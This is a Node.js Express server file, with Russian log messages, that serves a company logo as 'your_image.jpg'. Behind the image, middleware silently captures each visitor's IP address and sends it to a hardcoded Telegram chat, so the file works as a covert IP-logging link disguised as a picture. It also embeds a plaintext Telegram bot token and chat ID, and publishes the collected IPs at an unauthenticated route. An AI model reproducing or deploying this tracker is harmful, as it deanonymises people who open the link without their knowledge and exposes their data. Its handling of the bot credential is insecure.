const express = require('express');
const app = express();
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');

// Create a new Telegram bot instance using your bot token
const bot = new TelegramBot('6985024526:AAFdGkUe-T6Nm1MAwDU4S9Ci-Y100bloN5A', { polling: false });

// Create an array to store received IP addresses
const receivedIPs = [];

app.use((req, res, next) => {
    const clientIp = req.ip;
    console.log(`IP-адрес посетителя: ${clientIp}`);

    // Store the client's IP address in the array
    receivedIPs.push(clientIp);

    // Send the client's IP address to your Telegram bot
    bot.sendMessage('565711735', `Client IP: ${clientIp}`)
        .then(() => {
            console.log('IP sent to Telegram bot');
        })
        .catch((error) => {
            console.error('Error sending IP to Telegram bot:', error);
        });

    next();
});

app.get('/', async (req, res) => {
    const imageUrl = 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/Kazdream_logo.svg/750px-Kazdream_logo.svg.png';

    try {
        const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        res.setHeader('Content-Type', 'image/jpeg');
        res.setHeader('Content-Disposition', 'inline; filename=your_image.jpg');
        res.send(Buffer.from(response.data, 'binary'));
    } catch (error) {
        console.error(error);
        res.status(500).send('Ошибка загрузки изображения');
    }
});

// Add a route to view the stored IP addresses
app.get('/view-ips', (req, res) => {
    res.json({ receivedIPs });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});

module.exports = app;
